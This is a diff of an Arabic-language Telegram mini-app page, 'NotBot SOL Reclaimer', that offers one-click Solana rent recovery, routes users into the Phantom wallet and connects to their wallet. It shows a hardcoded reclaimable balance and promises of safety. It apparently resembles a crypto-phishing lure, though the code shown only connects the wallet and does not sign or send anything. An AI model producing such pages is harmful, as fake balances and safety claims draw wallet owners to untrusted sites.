@@ -6,30 +6,81 @@
     <title>NotBot SOL Reclaimer</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #0b0e14; color: #ffffff; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; text-align: center; }
-        .card { background: #151a23; border: 1px solid #232a3b; border-radius: 16px; padding: 24px; width: 100%; max-width: 380px; }
-        .btn { background: #ab9ff2; color: #0b0e14; border: none; border-radius: 12px; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
+        .card { background: #151a23; border: 1px solid #232a3b; border-radius: 16px; padding: 24px; width: 100%; max-width: 380px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        h1 { font-size: 22px; margin-bottom: 12px; color: #ab9ff2; }
+        p { font-size: 14px; color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }
+        .stats { background: #0b0e14; border-radius: 10px; padding: 12px; margin-bottom: 20px; border: 1px solid #1f293d; }
+        .stat-val { font-size: 18px; font-weight: bold; color: #14f195; }
+        .btn { background: linear-gradient(135deg, #ab9ff2 0%, #7d6ee8 100%); color: #0b0e14; border: none; border-radius: 12px; padding: 15px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; }
+        .btn:active { transform: scale(0.98); }
+        .status-box { font-size: 13px; color: #38bdf8; margin-top: 15px; min-height: 20px; }
+        .footer { margin-top: 15px; font-size: 12px; color: #64748b; }
     </style>
 </head>
 <body>
+
     <div class="card">
         <h1>تأكيد استرداد الرنت ⚡</h1>
-        <button class="btn" onclick="handleWalletAction()">⚡ فتح وتأكيد في Phantom</button>
-        <div id="statusText" style="margin-top:15px; color:#38bdf8;"></div>
+        <p>استرداد رسوم سولانا للحسابات الفارغة بضغطة زر واحدة وآمان تام.</p>
+
+        <div class="stats">
+            <div style="font-size: 12px; color: #64748b; margin-bottom: 4px;">المبلغ المتاح للاسترداد</div>
+            <div class="stat-val">0.01020 SOL</div>
+        </div>
+
+        <button class="btn" id="actionBtn" onclick="handleWalletAction()">⚡ فتح وتأكيد في Phantom</button>
+        <div class="status-box" id="statusText"></div>
+
+        <div class="footer">
+            🔒 اتصال آمن ومباشر عبر شبكة سولانا
+        </div>
     </div>
+
     <script>
-        function handleWalletAction() {
-            const targetUrl = "https://shenouda77.github.io/notbot-app/";
-            const encodedUrl = encodeURIComponent(targetUrl);
-            const phantomUri = "phantom://browse/" + encodedUrl;
-            const phantomUniversal = "https://phantom.app/ul/browse/" + encodedUrl;
-            
-            window.location.href = phantomUri;
-            setTimeout(() => {
-                window.location.href = phantomUniversal;
-            }, 800);
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
         }
+
+        function checkInsidePhantom() {
+            return window.solana && window.solana.isPhantom;
+        }
+
+        async function handleWalletAction() {
+            const status = document.getElementById("statusText");
+
+            if (checkInsidePhantom()) {
+                try {
+                    status.innerText = "جاري الاتصال بالمحفظة...";
+                    const resp = await window.solana.connect();
+                    status.innerText = "✅ متصل: " + resp.publicKey.toString().slice(0, 4) + "..." + resp.publicKey.toString().slice(-4);
+                    alert("تم الاتصال بنجاح: " + resp.publicKey.toString());
+                } catch (err) {
+                    status.innerText = "❌ تم رفض الاتصال من المحفظة.";
+                }
+            } else {
+                status.innerText = "جاري التحويل إلى تطبيق Phantom...";
+                const targetUrl = encodeURIComponent("https://shenouda77.github.io/notbot-app/");
+                const phantomUniversal = "https://phantom.app/ul/browse/" + targetUrl + "?ref=" + encodeURIComponent("https://shenouda77.github.io");
+
+                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openLink) {
+                    window.Telegram.WebApp.openLink(phantomUniversal);
+                } else {
+                    window.location.href = phantomUniversal;
+                }
+            }
+        }
+
+        window.addEventListener("load", () => {
+            setTimeout(() => {
+                if (checkInsidePhantom()) {
+                    document.getElementById("actionBtn").innerText = "تأكيد واسترداد الرنت الآن";
+                    document.getElementById("statusText").innerText = "أنت الآن داخل فانتوم، اضغط للتأكيد.";
+                }
+            }, 400);
+        });
     </script>
 </body>
 </html>
